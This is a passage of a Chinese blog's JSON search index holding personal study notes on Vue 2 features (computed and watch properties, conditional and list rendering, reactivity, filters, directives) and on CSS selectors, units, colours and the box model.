","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:5:0","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#键盘事件"},{"categories":null,"content":"\r小tips修饰符可以连续写比如@click.prevent.stop和@keydown.ctrl.y ","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:5:1","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#小tips"},{"categories":null,"content":"\r计算属性vue中绑定的数据修改时，vue会重新解析模板。 使用示例 text computed{ fullName:{ get(){ return firstName + lastName } } }\r计算属性定义：根据已有的属性进行一些计算加工生成的新属性就叫计算属性。使用配置项computed，计算属性最终会在vm对象身上，但是不在_data里。 原理：底层借助了Objcet.defineproperty方法提供的gtter和setter。 计算属性的值使用getter调用，多次调用会使用缓存，getter什么时候调用？ 初次读取计算属性时 所依赖的数据发生改变时 如果计算属性要被修改，必须使用set函数响应修改，切记set函数中要修改依赖的属性 ","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:6:0","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#计算属性"},{"categories":null,"content":"\r简写确定只读取不修改可以使用简写模式。示例 text fullNmae(){ return }\r","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:6:1","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#简写"},{"categories":null,"content":"\r监视属性配置对象watch:{}，代码示例 text watch：{ isHot:{ immediate:true，//初始化时让handler调用一下 //handler什么时候调用？当isHot发生改变时。 handler(newValue,oldValue){ console.log(\"isHot被修改了',newValue,oldValue) } } }\r监视属性也可以监视计算属性，监视属性的另一种写法 text vm.$wathc('变量名',{配置项同上 })\r","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:7:0","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#监视属性"},{"categories":null,"content":"\r深度监视Vue中的watch默认不监测对象内部值的改变，配置deep:true可以监测对象内部值的改变。Vue自身可以监测对象内部值的改变，但是Vue提供的watch默认不可以，使用watch的时候根据数据的具体结构，决定是否采用深度监视。 有简写形式 ","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:8:0","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#深度监视"},{"categories":null,"content":"\r监视属性vs计算属性还是要看具体需求。 computed能完成的功能，watch都可以完成。 watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。 两个重要的小原则： 所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等），最好写成箭函数，这样this的指向才是vm或组件实例对象。 ","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:9:0","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#监视属性vs计算属性"},{"categories":null,"content":"\r绑定样式 class样式 写法：class=“xxx” xxx可以是字符串、对象、数组。 字符串写法适用于：类名不确定，要动态获取。 对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。 数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。 style样式 :style=\"{fontSize：xxx}“其中xxx是动态值。 :style=\"[a,b]“其中a、b是样式对象。 ","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:10:0","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#绑定样式"},{"categories":null,"content":"\r条件渲染v-if写法： (1).v-if=“表达式” (2)v-else-if=“表达式” (3).v-else=“表达式” 适用于：切换频率较低的场景。 特点：不展示的DOM元素直接被移除。 注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。 v-show写法：v-show=“表达武” 适用于：切换频率较高的场景。 特点：不展示的DOM元素未被移除，仅仅是使用样式隐藏掉。 备注：使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。 还有一个点if和template配合使用保持原来的html结构 ","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:11:0","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#条件渲染"},{"categories":null,"content":"\r列表渲染v-for指令： 用于展示列表数据 语法：v-for=\"(item,index)in xxx’\":key=“yyy” 可遍历：数组、对象、字符串（用的很少）、指定次数(用的很少) key的作用和原理 面试题：react、vue中的key有什么作用？(key的内部原理) 虚拟DoM中key的作用： key是虚拟DoM对象的标识，当数据发生变化时，Vue会根据新数据生成新的虚拟DoM,随后Vue进行新虚拟DoM与旧虚拟DoM的差异比较，比较规则如下： 对比规则： 旧虚拟DoM中找到了与新虚拟DoM相同的key。 若虚拟DoM中内容没变，直接使用之前的真实DoM！ 若虚拟DoM中内容变了，则生成新的真实DoM,随后替换掉页面中之前的真实D0M。 旧拟DoM中未找到与新虚拟DoM相同的key 创建新的真实DOM,随后渲染到到页面。 用index作为key可能会发的问题： 若对数据进行：逆序添加、逆序明除等破坏顺序操作，会产生没有必要的真实DoM更新==\u003e界面效果没问题，但效率低。 如果结构中还包含输入类的DoM，会产生错误DoM更新==\u003e界面而有问题。 开发中如何选择key？ 最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值。 如果不存在对数据的逆序添加、逆序则除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。 ","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:12:0","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#列表渲染"},{"categories":null,"content":"\r列表排序\u0026过滤能用computed的就不用watch ","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:13:0","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#列表排序过滤"},{"categories":null,"content":"\r监测数据的原理","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:14:0","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#监测数据的原理"},{"categories":null,"content":"\r对象的检测首先对data数据进行加工，设置响应式的getter和setter，大概的核心代码如下 javascript let data = { name:\"xx\", address:\"dd\" } const obs = new Observer(data) let vm={} vm._data = data = obs function Observer(obj){ //汇总对象里的属性形成一个数组 keys = Object.keys(obj) //遍历 keys.forEach(k =\u003e { Object.defineProperties(this,k,{ get(){ return obj[k] }, set(val){ //Vue重新模板解析 obj[k] = val } }) }); }\r并且Vue底层使用递归的方式对所有嵌套的对象属性都进行了数据监测方法的加工。 Vue提供了一个API的set方法Vue.set()或vm.$set()，可以为已经创建的对象添加响应式的属性。传入参数列表：target，key，val。局限性：target对象不能是Vue实例或者Vue实例的根数据对象。 ","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:14:1","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#对象的检测"},{"categories":null,"content":"\r数据的检测通过包裹数组中更新元素的方法实现，本质上做了两件事 调用原型中的数组更新方法 Vue重新进行模板解析，更新页面 Vue包裹的7种方法： push() pop() shift() unshift() splice() sort() reverse() 也可以使用Vue提供的API：Vue.set()或vm.$set() ","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:14:2","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#数据的检测"},{"categories":null,"content":"\r收集表单数据根据\u003cinput\u003e标签的类型不同，v-model收集的值也不同，分为以下几种情况 text类型。收集的是value属性 radio类型。收集的同样是value属性，但是需要给标签配置value值并成组 checkbox类型。如果没有配置value属性，收集的是选项框的checked属性。如果配置了value属性，根据v-model绑定属性的初始值不同有两种情况：1.绑定属性初始值为非数组，收集的是checked属性。2.绑定属性为数组，收集的就是value组成的数组 v-model的三个常用修饰符： lazy。输入框失去焦点时收集数据 number。输入字符串为有效数字 trim。过滤首尾空格 ","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:15:0","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#收集表单数据"},{"categories":null,"content":"\r过滤器对数据进行格式化显示。语法： 注册过滤器：全局注册Vue.filter(name,callback) 或 局部注册new Vue{filters{}} 使用过滤器：{{xxx | filter}} 或 v-bind:属性 = xxx | filter 过滤器可以接受多个参数，第一个默认是管道符前的数据。多个管道符可以串联（按顺序调用） ","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:16:0","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#过滤器"},{"categories":null,"content":"\r内置指令v-bind：单项绑定解析表达式可以简写为:xxx v-model：双向绑定数据 v-for：遍历数组/字符串/对象 v-on：绑定事件监听，可以简写为@ v-if（v-else）：条件渲染 v-show：控制节点是否展示 v-test：所在节点渲染文本内容。和插值语法区别，前者会直接替换掉节点里的内容，插值语法不会。 v-html：向所在节点渲染包含html结构的内容。指令可以识别html结构。但是要注意XSS攻击 ","date":"2022-03-07","objectID":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:17:0","series":null,"tags":null,"title":"Vue学习笔记","uri":"/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#内置指令"},{"categories":null,"content":"\r选择器 element p 选择所有 \u003cp\u003e 元素。 element.class p.intro 选择 class=“intro” 的所有 \u003cp\u003e 元素。 element,element div, p 选择所有 \u003cdiv\u003e 元素和所有 \u003cp\u003e 元素。 element element div p 选择 \u003cdiv\u003e 元素内的所有 \u003cp\u003e 元素。 element\u003eelement div \u003e p 选择父元素是 \u003cdiv\u003e 的所有 \u003cp\u003e 元素。 element+element div + p 选择紧跟 \u003cdiv\u003e 元素的首个 \u003cp\u003e 元素。 element1~element2 p ~ ul 选择前面有 \u003cp\u003e 元素的每个 \u003cul\u003e 元素。 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:0:1","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#选择器"},{"categories":null,"content":"\r选择器的权重选择器权重（从上往下优先级变低）： 内联样式 id选择器 类和伪类选择器 元素选择器 通配选择器 继承优先级（没有优先级） 比较优先级时，需要将所有选择器的优先级相加计算，最后优先级越高的优先显示（分组选择器是单独计算的） css div#box (相加计算) div,p,span (单独计算)\r如果优先级计算后相同，则根据代码最后设置的样式显示。 可以在样式后后面添加!important，可以获得最高优先级（慎用） a标签样式顺序：https://www.cnblogs.com/Yirannnnnn/p/4540061.html ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:0:2","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#选择器的权重"},{"categories":null,"content":"\r像素和百分比\r像素屏幕实际是由一个一个的小像素点组成，不同的屏幕像素大小不同，像素越小的屏幕像素点密集，图像效果显示越清晰，所以同样写200px在不同的屏幕显示的效果不一样。 百分比相对于父元素属性的百分比，设置百分比可以使子元素跟随父元素改变。 em相对元素字体大小计算的单位，1em = 1 font-size。会跟随字体的大小改变而改变。 rem相对根元素（html字体大小）字体大小计算。 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:0:3","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#像素和百分比"},{"categories":null,"content":"\r像素和百分比\r像素屏幕实际是由一个一个的小像素点组成，不同的屏幕像素大小不同，像素越小的屏幕像素点密集，图像效果显示越清晰，所以同样写200px在不同的屏幕显示的效果不一样。 百分比相对于父元素属性的百分比，设置百分比可以使子元素跟随父元素改变。 em相对元素字体大小计算的单位，1em = 1 font-size。会跟随字体的大小改变而改变。 rem相对根元素（html字体大小）字体大小计算。 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:0:3","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#像素"},{"categories":null,"content":"\r像素和百分比\r像素屏幕实际是由一个一个的小像素点组成，不同的屏幕像素大小不同，像素越小的屏幕像素点密集，图像效果显示越清晰，所以同样写200px在不同的屏幕显示的效果不一样。 百分比相对于父元素属性的百分比，设置百分比可以使子元素跟随父元素改变。 em相对元素字体大小计算的单位，1em = 1 font-size。会跟随字体的大小改变而改变。 rem相对根元素（html字体大小）字体大小计算。 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:0:3","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#百分比"},{"categories":null,"content":"\r像素和百分比\r像素屏幕实际是由一个一个的小像素点组成，不同的屏幕像素大小不同，像素越小的屏幕像素点密集，图像效果显示越清晰，所以同样写200px在不同的屏幕显示的效果不一样。 百分比相对于父元素属性的百分比，设置百分比可以使子元素跟随父元素改变。 em相对元素字体大小计算的单位，1em = 1 font-size。会跟随字体的大小改变而改变。 rem相对根元素（html字体大小）字体大小计算。 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:0:3","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#em"},{"categories":null,"content":"\r像素和百分比\r像素屏幕实际是由一个一个的小像素点组成，不同的屏幕像素大小不同，像素越小的屏幕像素点密集，图像效果显示越清晰，所以同样写200px在不同的屏幕显示的效果不一样。 百分比相对于父元素属性的百分比，设置百分比可以使子元素跟随父元素改变。 em相对元素字体大小计算的单位，1em = 1 font-size。会跟随字体的大小改变而改变。 rem相对根元素（html字体大小）字体大小计算。 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:0:3","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#rem"},{"categories":null,"content":"\rRGB值RGB通过三种颜色的不同浓度来调配出不同的颜色 R red, G green,B blue 每一种颜色的范围在0 - 255 (0% - 100%) 之间，语法: RGB(红色，绿色,蓝色) RGBA就是在rgb的基础上增加了一个a表示不透明度，需要四个值，前三个和rgb一样，第四个表示不透明度（最大值1），1表示完全不透明0表示完全 透明5 半透明。 十六进制的RGB值#红色绿色蓝色 两位重复可以缩写 HSL值H 色相（0-360） S 饱和度，颜色的浓度（0-100%） L 亮度，颜色的亮度（0-100%） HSLA ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:0:4","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#rgb值"},{"categories":null,"content":"\rRGB值RGB通过三种颜色的不同浓度来调配出不同的颜色 R red, G green,B blue 每一种颜色的范围在0 - 255 (0% - 100%) 之间，语法: RGB(红色，绿色,蓝色) RGBA就是在rgb的基础上增加了一个a表示不透明度，需要四个值，前三个和rgb一样，第四个表示不透明度（最大值1），1表示完全不透明0表示完全 透明5 半透明。 十六进制的RGB值#红色绿色蓝色 两位重复可以缩写 HSL值H 色相（0-360） S 饱和度，颜色的浓度（0-100%） L 亮度，颜色的亮度（0-100%） HSLA ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:0:4","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#rgba"},{"categories":null,"content":"\rRGB值RGB通过三种颜色的不同浓度来调配出不同的颜色 R red, G green,B blue 每一种颜色的范围在0 - 255 (0% - 100%) 之间，语法: RGB(红色，绿色,蓝色) RGBA就是在rgb的基础上增加了一个a表示不透明度，需要四个值，前三个和rgb一样，第四个表示不透明度（最大值1），1表示完全不透明0表示完全 透明5 半透明。 十六进制的RGB值#红色绿色蓝色 两位重复可以缩写 HSL值H 色相（0-360） S 饱和度，颜色的浓度（0-100%） L 亮度，颜色的亮度（0-100%） HSLA ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:0:4","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#十六进制的rgb值"},{"categories":null,"content":"\rRGB值RGB通过三种颜色的不同浓度来调配出不同的颜色 R red, G green,B blue 每一种颜色的范围在0 - 255 (0% - 100%) 之间，语法: RGB(红色，绿色,蓝色) RGBA就是在rgb的基础上增加了一个a表示不透明度，需要四个值，前三个和rgb一样，第四个表示不透明度（最大值1），1表示完全不透明0表示完全 透明5 半透明。 十六进制的RGB值#红色绿色蓝色 两位重复可以缩写 HSL值H 色相（0-360） S 饱和度，颜色的浓度（0-100%） L 亮度，颜色的亮度（0-100%） HSLA ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:0:4","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#hsl值"},{"categories":null,"content":"\r布局","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:1:0","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#布局"},{"categories":null,"content":"\r文档流(normal flow)网页是一个多层的结构，一层摞着一层通过CSS可以分别为每一层来设置样式，作为用户来讲只能看到最顶上一层，这些层中，最底下的一层称为文档流，文档流是网页的基础，我们所创建的元素默认都是在文档流中进行排列，对于我们来元素主要有两个状态： 在文档流中 不在文档流中(脱离文档流) 元素在文档流中有什么特点: 块元素 块元素会在页面中独占一行(自上向下垂直排列) 默认宽度是父元素的全部(会把父元素撑满) 默认高度是被内容撑开(子元素) 行内元素 行内元素不会独占页面的一行，只占自身的大小 行内元素在页面中左向右水平排列，如果行之中不能则元素 会换到第二行继续自左向右排列(书写习惯一样) 行内元素的默认宽度和高度都是被内容撑开 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:1:1","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#文档流normal-flow"},{"categories":null,"content":"\r盒子模型(box model)CSS页面将所有的元素设置为了一个矩形的盒子，对页面的布局就变成了将不同的盒子摆放到不同的位置。每一个盒子都有一下几个部分组成： 内容区(content) 内边距(padding) 边框(border) 外边距(margin) 内容区(content)内容区大小由 width 和 height 两个属性来设置。 边框(border)盒子的边缘，边框里面是盒子内部，外面是盒子外部，边框的大小会影响到盒子的大小。边框至少需要设置三个样式： 边框的宽度 border-width 默认3px。简写值可有四个： 四个值：上、下、左、右 三个值：上、左右、下 两个：上下、左右 一个值：上下左右 还可以写成border-xxx-width，其中xxx可选top、right、bottom、left指定某一个边的宽度 边框的颜色 border-color 规则同边框的宽度 border-width，如果忽略自动使用color颜色 边框的样式 border-style 规则同边框的宽度 border-width，默认值是none，solid表示实线、dotted点状虚线、dashed虚线、double双线 边框可以简写一个属性border按以上三个属性值顺序使用 内边距(padding)四个方向：top、right、bottom、left。内边距设置会影响盒子大小，背景颜色会延伸到内边距上。一个盒子的可见框大小由内容区、内边距、边框共同决定，计算时都要加上。padding简写形式同 边框的宽度 border-width。 外边距(margin)外边距不会影响盒子可见框大小，影响盒子位置，一个四个方向同padding，通常是设置左上外边距，右下外边距会移动其他元素，bottom的值会影响下方元素移动。简写同上 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:1:2","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#盒子模型box-model"},{"categories":null,"content":"\r盒子模型(box model)CSS页面将所有的元素设置为了一个矩形的盒子，对页面的布局就变成了将不同的盒子摆放到不同的位置。每一个盒子都有一下几个部分组成： 内容区(content) 内边距(padding) 边框(border) 外边距(margin) 内容区(content)内容区大小由 width 和 height 两个属性来设置。 边框(border)盒子的边缘，边框里面是盒子内部，外面是盒子外部，边框的大小会影响到盒子的大小。边框至少需要设置三个样式： 边框的宽度 border-width 默认3px。简写值可有四个： 四个值：上、下、左、右 三个值：上、左右、下 两个：上下、左右 一个值：上下左右 还可以写成border-xxx-width，其中xxx可选top、right、bottom、left指定某一个边的宽度 边框的颜色 border-color 规则同边框的宽度 border-width，如果忽略自动使用color颜色 边框的样式 border-style 规则同边框的宽度 border-width，默认值是none，solid表示实线、dotted点状虚线、dashed虚线、double双线 边框可以简写一个属性border按以上三个属性值顺序使用 内边距(padding)四个方向：top、right、bottom、left。内边距设置会影响盒子大小，背景颜色会延伸到内边距上。一个盒子的可见框大小由内容区、内边距、边框共同决定，计算时都要加上。padding简写形式同 边框的宽度 border-width。 外边距(margin)外边距不会影响盒子可见框大小，影响盒子位置，一个四个方向同padding，通常是设置左上外边距，右下外边距会移动其他元素，bottom的值会影响下方元素移动。简写同上 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:1:2","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#内容区content"},{"categories":null,"content":"\r盒子模型(box model)CSS页面将所有的元素设置为了一个矩形的盒子，对页面的布局就变成了将不同的盒子摆放到不同的位置。每一个盒子都有一下几个部分组成： 内容区(content) 内边距(padding) 边框(border) 外边距(margin) 内容区(content)内容区大小由 width 和 height 两个属性来设置。 边框(border)盒子的边缘，边框里面是盒子内部，外面是盒子外部，边框的大小会影响到盒子的大小。边框至少需要设置三个样式： 边框的宽度 border-width 默认3px。简写值可有四个： 四个值：上、下、左、右 三个值：上、左右、下 两个：上下、左右 一个值：上下左右 还可以写成border-xxx-width，其中xxx可选top、right、bottom、left指定某一个边的宽度 边框的颜色 border-color 规则同边框的宽度 border-width，如果忽略自动使用color颜色 边框的样式 border-style 规则同边框的宽度 border-width，默认值是none，solid表示实线、dotted点状虚线、dashed虚线、double双线 边框可以简写一个属性border按以上三个属性值顺序使用 内边距(padding)四个方向：top、right、bottom、left。内边距设置会影响盒子大小，背景颜色会延伸到内边距上。一个盒子的可见框大小由内容区、内边距、边框共同决定，计算时都要加上。padding简写形式同 边框的宽度 border-width。 外边距(margin)外边距不会影响盒子可见框大小，影响盒子位置，一个四个方向同padding，通常是设置左上外边距，右下外边距会移动其他元素，bottom的值会影响下方元素移动。简写同上 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:1:2","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#边框border"},{"categories":null,"content":"\r盒子模型(box model)CSS页面将所有的元素设置为了一个矩形的盒子，对页面的布局就变成了将不同的盒子摆放到不同的位置。每一个盒子都有一下几个部分组成： 内容区(content) 内边距(padding) 边框(border) 外边距(margin) 内容区(content)内容区大小由 width 和 height 两个属性来设置。 边框(border)盒子的边缘，边框里面是盒子内部，外面是盒子外部，边框的大小会影响到盒子的大小。边框至少需要设置三个样式： 边框的宽度 border-width 默认3px。简写值可有四个： 四个值：上、下、左、右 三个值：上、左右、下 两个：上下、左右 一个值：上下左右 还可以写成border-xxx-width，其中xxx可选top、right、bottom、left指定某一个边的宽度 边框的颜色 border-color 规则同边框的宽度 border-width，如果忽略自动使用color颜色 边框的样式 border-style 规则同边框的宽度 border-width，默认值是none，solid表示实线、dotted点状虚线、dashed虚线、double双线 边框可以简写一个属性border按以上三个属性值顺序使用 内边距(padding)四个方向：top、right、bottom、left。内边距设置会影响盒子大小，背景颜色会延伸到内边距上。一个盒子的可见框大小由内容区、内边距、边框共同决定，计算时都要加上。padding简写形式同 边框的宽度 border-width。 外边距(margin)外边距不会影响盒子可见框大小，影响盒子位置，一个四个方向同padding，通常是设置左上外边距，右下外边距会移动其他元素，bottom的值会影响下方元素移动。简写同上 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:1:2","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#内边距padding"},{"categories":null,"content":"\r盒子模型(box model)CSS页面将所有的元素设置为了一个矩形的盒子，对页面的布局就变成了将不同的盒子摆放到不同的位置。每一个盒子都有一下几个部分组成： 内容区(content) 内边距(padding) 边框(border) 外边距(margin) 内容区(content)内容区大小由 width 和 height 两个属性来设置。 边框(border)盒子的边缘，边框里面是盒子内部，外面是盒子外部，边框的大小会影响到盒子的大小。边框至少需要设置三个样式： 边框的宽度 border-width 默认3px。简写值可有四个： 四个值：上、下、左、右 三个值：上、左右、下 两个：上下、左右 一个值：上下左右 还可以写成border-xxx-width，其中xxx可选top、right、bottom、left指定某一个边的宽度 边框的颜色 border-color 规则同边框的宽度 border-width，如果忽略自动使用color颜色 边框的样式 border-style 规则同边框的宽度 border-width，默认值是none，solid表示实线、dotted点状虚线、dashed虚线、double双线 边框可以简写一个属性border按以上三个属性值顺序使用 内边距(padding)四个方向：top、right、bottom、left。内边距设置会影响盒子大小，背景颜色会延伸到内边距上。一个盒子的可见框大小由内容区、内边距、边框共同决定，计算时都要加上。padding简写形式同 边框的宽度 border-width。 外边距(margin)外边距不会影响盒子可见框大小，影响盒子位置，一个四个方向同padding，通常是设置左上外边距，右下外边距会移动其他元素，bottom的值会影响下方元素移动。简写同上 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:1:2","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#外边距margin"},{"categories":null,"content":"\r水平方向的布局元素在其父元素水平方向的位置由以下七个属性共同决定 text margin-left + border-left + padding-left + width + padding-right + border-right + margin-right = 其父 元素内容区的宽度(必须满足)\r如果等式不成立，则成为过度约束，等式会自动调整。调整情况： 如果七个值没有值为auto的情况，浏览器会调整margin 如果某一个属性值为auto，则调整此属性的值使等式成立 如果将一个宽度和一个外边距设置为auto，则宽度会调整到最大，设置为auto的外边距会自动为0 如果将三个值都设置为auto，则外边距都是0，宽度最大 如果将两个外边距设置为auto，宽度固定值，则会将外边距设置为相同的值所以我们经常利用这个特点来使一个元素 在其父元素中水平居中 示例: width:xxxpx; margin:0 auto; ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:1:3","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#水平方向的布局"},{"categories":null,"content":"\r垂直方向的布局子元素在父元素内容区排列，如果子元素大小超过了父元素，则会从父元素中溢出(overflow)，使用overflow属性设置父元素对溢出子元素的处理。可选值： visible 默认值子元素会从父元素中溢出，在父元素外部的位置显示 hidden 溢出内容将会被裁剪不会显示 scroll 生成两个滚动条，通过滚动条来查看完整的内容 auto 根据需要生成滚动条 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:1:4","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#垂直方向的布局"},{"categories":null,"content":"\r垂直外边距折叠相邻的垂直方向外边距会发生重叠现象。有以下两种情况 兄弟元素之间 兄弟元素间的相邻垂直外边距会取两者之间的较大值(两者都是正值) 特殊情况: 如果相邻的外边距一正一负，则取两者的和。 如果相邻的外边距都是负值，则取两者中绝对值较大的 同号折叠(取最大值)，异号相加。兄弟元素之间的外边距的重叠，对于开发是有利的，所以不需要进行处理 父子元素 父子元素间相邻外边距，子元素的会传递给父元素(上外边距) ，父子外边距的折叠会影响到页面的布局，必须要进行处理 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:1:5","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#垂直外边距折叠"},{"categories":null,"content":"\r行内元素盒模型行内元素不支持设置宽度和高度，但是可以设置padding、border、margin，设置属性后不垂直方向不会影响页面布局。 display用来设置元素显示类型，可选值： inline 将元素设置为行内元素 block 将元素设置为块元素 inline-block 将元素设置为行内元素，行内块，既可以设置高宽又不会独占一行 table 将元素设置为一个表格 none 元素不在页面中显示 visibility用来设置元素的显示状态，可选值： visible 默认值，元素在页面中正常显示 hidden 元素在页面中隐藏不显示，但是占据页面位置 ","date":"2022-02-15","objectID":"/posts/css%E5%AD%A6%E4%B9%A0/:1:6","series":null,"tags":null,"title":"CSS学习","uri":"/posts/css%E5%AD%A6%E4%B9%A0/#行内元素盒模型"},{"categories":null,"content":"\r浏览器默认样式通常情况，浏览器都会为元素设置一些默认样式，默认样式会影响页面布局，需要去除浏览器默认样式。 text *{ margin: 0; padding: 0; 